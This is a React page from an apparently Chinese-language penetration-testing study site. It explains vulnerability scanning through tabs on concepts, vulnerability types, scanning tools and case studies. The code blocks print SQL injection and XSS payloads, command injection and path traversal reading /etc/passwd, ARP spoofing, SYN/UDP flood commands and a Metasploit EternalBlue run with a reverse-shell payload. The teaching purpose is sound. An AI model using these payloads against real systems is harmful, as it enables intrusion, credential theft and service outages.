'use client';
import { useState } from 'react';
import Link from 'next/link';

export default function PenetrationScanPage() {
  const [activeTab, setActiveTab] = useState('intro');

  return (
    <div className="container mx-auto px-4 py-8">
      <h1 className="text-3xl font-bold mb-8">漏洞扫描</h1>

      {/* 标签页导航 */}
      <div className="flex space-x-4 mb-6 border-b overflow-x-auto">
        <button
          onClick={() => setActiveTab('intro')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'intro'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          基础概念
        </button>
        <button
          onClick={() => setActiveTab('types')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'types'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          漏洞类型
        </button>
        <button
          onClick={() => setActiveTab('tools')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'tools'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          扫描工具
        </button>
        <button
          onClick={() => setActiveTab('practice')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'practice'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          实践案例
        </button>
      </div>

      {/* 内容区域 */}
      <div className="bg-white rounded-lg shadow-md p-6">
        {activeTab === 'intro' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">漏洞扫描基础概念</h3>
            
            <div className="prose max-w-none">
              <h4 className="font-semibold text-lg mb-2">什么是漏洞扫描？</h4>
              <p className="mb-4">
                漏洞扫描是渗透测试中的重要环节，通过自动化工具或手动方式对目标系统进行安全漏洞检测。漏洞扫描可以帮助发现系统中存在的安全风险，为后续的漏洞修复提供依据。
              </p>

              <h4 className="font-semibold text-lg mb-2">漏洞扫描的分类</h4>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">1. 自动化扫描</h5>
                  <p className="text-sm text-gray-700">
                    使用自动化工具进行漏洞扫描：
                    <ul className="list-disc pl-6 mt-2">
                      <li>优点：效率高，覆盖面广</li>
                      <li>缺点：可能存在误报和漏报</li>
                      <li>适用：大规模系统扫描</li>
                      <li>特点：可以定期执行，持续监控</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">2. 手动扫描</h5>
                  <p className="text-sm text-gray-700">
                    由安全专家手动进行漏洞检测：
                    <ul className="list-disc pl-6 mt-2">
                      <li>优点：准确性高，深度好</li>
                      <li>缺点：效率较低，成本高</li>
                      <li>适用：关键系统深度测试</li>
                      <li>特点：可以发现复杂漏洞</li>
                    </ul>
                  </p>
                </div>
              </div>

              {/* SVG图表：漏洞扫描流程 */}
              <div className="my-8">
                <svg width="800" height="400" viewBox="0 0 800 400" className="w-full">
                  <defs>
                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="0%">
                      <stop offset="0%" style={{stopColor: '#4F46E5', stopOpacity: 1}} />
                      <stop offset="100%" style={{stopColor: '#7C3AED', stopOpacity: 1}} />
                    </linearGradient>
                    <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
                      <polygon points="0 0, 10 3.5, 0 7" fill="#4F46E5"/>
                    </marker>
                  </defs>
                  
                  {/* 背景圆环 */}
                  <circle cx="400" cy="200" r="150" fill="none" stroke="#E5E7EB" strokeWidth="2"/>
                  
                  {/* 主要阶段 */}
                  <g transform="translate(400,200)">
                    {/* 目标识别 */}
                    <g transform="rotate(-45)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">目标识别</text>
                    </g>
                    
                    {/* 漏洞扫描 */}
                    <g transform="rotate(45)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">漏洞扫描</text>
                    </g>
                    
                    {/* 漏洞验证 */}
                    <g transform="rotate(135)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">漏洞验证</text>
                    </g>
                    
                    {/* 报告生成 */}
                    <g transform="rotate(225)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">报告生成</text>
                    </g>
                  </g>
                  
                  {/* 连接箭头 */}
                  <path d="M 400 50 L 400 350" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#arrowhead)"/>
                  <path d="M 50 200 L 750 200" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#arrowhead)"/>
                  
                  {/* 中心点 */}
                  <circle cx="400" cy="200" r="10" fill="#4F46E5"/>
                </svg>
              </div>

              <h4 className="font-semibold text-lg mb-2">漏洞扫描的基本流程</h4>
              <div className="space-y-4">
                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">1. 目标识别</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>确定扫描范围：明确需要扫描的系统、应用和网络范围</li>
                      <li>收集目标信息：获取目标系统的基本信息，如IP地址、域名等</li>
                      <li>制定扫描策略：根据目标特点制定合适的扫描策略</li>
                      <li>准备扫描环境：配置扫描工具和测试环境</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">2. 漏洞扫描</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>执行自动化扫描：使用扫描工具进行自动化漏洞检测</li>
                      <li>记录扫描结果：保存扫描过程中发现的所有问题</li>
                      <li>初步分析：对扫描结果进行初步分析和分类</li>
                      <li>标记可疑点：标记需要进一步验证的漏洞</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">3. 漏洞验证</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>手动验证：对自动化扫描发现的漏洞进行手动验证</li>
                      <li>漏洞复现：尝试复现漏洞，确认其真实性</li>
                      <li>风险评估：评估漏洞的风险等级和影响范围</li>
                      <li>漏洞分类：根据验证结果对漏洞进行分类</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">4. 报告生成</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>整理扫描结果：整理所有验证过的漏洞信息</li>
                      <li>编写漏洞报告：详细描述每个漏洞的情况</li>
                      <li>提供修复建议：针对每个漏洞提供修复方案</li>
                      <li>总结分析：对整体扫描结果进行总结和分析</li>
                    </ul>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'types' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">常见漏洞类型</h3>

            <div className="space-y-4">
              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">1. Web应用漏洞</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>SQL注入：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 基本SQL注入测试
' OR '1'='1
' OR '1'='1' --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --

# 盲注测试
' AND 1=1 --
' AND 1=2 --
' AND (SELECT COUNT(*) FROM users)>0 --`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>XSS漏洞：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 反射型XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

# 存储型XSS
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

# DOM型XSS
document.write('<img src=x onerror=alert("XSS")>')`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">2. 系统漏洞</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>远程代码执行：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 命令注入
; ls -la
| cat /etc/passwd
**- cat /etc/passwd **

# 文件包含
../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>权限提升：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# SUID提权
find / -perm -4000 -type f 2>/dev/null
./vulnerable_binary

# 内核提权
uname -a
searchsploit kernel_version`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">3. 网络漏洞</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>中间人攻击：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# ARP欺骗
arpspoof -i eth0 -t 192.168.1.1 192.168.1.2

# SSL剥离
sslstrip -l 8080

# 数据包嗅探
tcpdump -i eth0 -w capture.pcap`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>拒绝服务：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# SYN洪水攻击
hping3 -S -p 80 --flood 192.168.1.1

# UDP洪水攻击
hping3 --udp -p 53 --flood 192.168.1.1

# HTTP慢速攻击
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://target.com -x 24 -p 3`}</code>
                    </pre>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'tools' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">漏洞扫描工具</h3>

            <div className="space-y-4">
              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">1. Web应用扫描工具</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>OWASP ZAP：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 启动ZAP
zap.sh

# 命令行扫描
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" http://example.com

# 自动化扫描
zap-cli spider http://example.com
zap-cli active-scan http://example.com
zap-cli report -o report.html`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>Burp Suite：</b>
                    <ul className="list-disc pl-6 mt-2">
                      <li>代理拦截和修改请求</li>
                      <li>漏洞扫描</li>
                      <li>自动化测试</li>
                      <li>API测试</li>
                    </ul>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">2. 系统漏洞扫描工具</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>Nessus：</b>
                    <ul className="list-disc pl-6 mt-2">
                      <li>支持多种漏洞检测</li>
                      <li>提供详细的漏洞报告</li>
                      <li>支持自定义扫描策略</li>
                      <li>支持合规性检查</li>
                    </ul>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>OpenVAS：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 启动OpenVAS
openvas-setup
openvas-start

# 创建扫描任务
omp -u admin -w admin --create-target --name "Target" --hosts 192.168.1.1
omp -u admin -w admin --create-task --name "Scan" --target "Target" --config "Full and fast"`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">3. 网络漏洞扫描工具</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>Nmap：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 基本扫描
nmap 192.168.1.1

# 详细扫描
nmap -sV -sC -p- 192.168.1.1

# 漏洞扫描
nmap --script vuln 192.168.1.1

# 操作系统检测
nmap -O 192.168.1.1`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>Metasploit：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 启动Metasploit
msfconsole

# 搜索漏洞利用模块
msf > search type:exploit platform:windows

# 使用漏洞利用模块
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.1.1
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.100
msf > exploit`}</code>
                    </pre>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'practice' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">漏洞扫描实践案例</h3>

            <div className="space-y-4">
              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">案例1：Web应用漏洞扫描</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>目标：</b>某电商网站
                  </p>
                  <p className="text-sm text-gray-700">
                    <b>扫描步骤：</b>
                    <ol className="list-decimal pl-6 mt-2">
                      <li>信息收集
                        <ul className="list-disc pl-6 mt-1">
                          <li>使用OWASP ZAP进行网站爬取</li>
                          <li>收集所有可访问的URL</li>
                          <li>识别网站使用的技术栈</li>
                        </ul>
                      </li>
                      <li>自动化扫描
                        <ul className="list-disc pl-6 mt-1">
                          <li>使用ZAP进行主动扫描</li>
                          <li>使用Burp Suite进行被动扫描</li>
                          <li>记录所有发现的漏洞</li>
                        </ul>
                      </li>
                      <li>漏洞验证
                        <ul className="list-disc pl-6 mt-1">
                          <li>手动验证SQL注入漏洞</li>
                          <li>测试XSS漏洞</li>
                          <li>检查CSRF漏洞</li>
                        </ul>
                      </li>
                      <li>报告编写
                        <ul className="list-disc pl-6 mt-1">
                          <li>漏洞描述和复现步骤</li>
                          <li>风险评估和影响分析</li>
                          <li>修复建议</li>
                        </ul>
                      </li>
                    </ol>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">案例2：内网漏洞扫描</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>目标：</b>企业内部网络
                  </p>
                  <p className="text-sm text-gray-700">
                    <b>扫描步骤：</b>
                    <ol className="list-decimal pl-6 mt-2">
                      <li>网络扫描
                        <ul className="list-disc pl-6 mt-1">
                          <li>使用Nmap进行端口扫描</li>
                          <li>识别开放服务</li>
                          <li>检测操作系统类型</li>
                        </ul>
                      </li>
                      <li>漏洞扫描
                        <ul className="list-disc pl-6 mt-1">
                          <li>使用Nessus进行漏洞扫描</li>
                          <li>使用Metasploit进行漏洞验证</li>
                          <li>检查系统配置问题</li>
                        </ul>
                      </li>
                      <li>权限提升
                        <ul className="list-disc pl-6 mt-1">
                          <li>测试本地提权漏洞</li>
                          <li>检查服务配置错误</li>
                          <li>验证弱密码问题</li>
                        </ul>
                      </li>
                      <li>横向移动
                        <ul className="list-disc pl-6 mt-1">
                          <li>内网主机扫描</li>
                          <li>密码哈希获取</li>
                          <li>远程命令执行</li>
                        </ul>
                      </li>
                    </ol>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* 底部导航 */}
      <div className="mt-8 flex justify-between">
        <Link 
          href="/study/security/penetration/recon"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
          ← 信息收集
        </Link>
        <Link 
          href="/study/security/penetration/exploit"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
          漏洞利用 →
        </Link>
      </div>
    </div>
  );
} 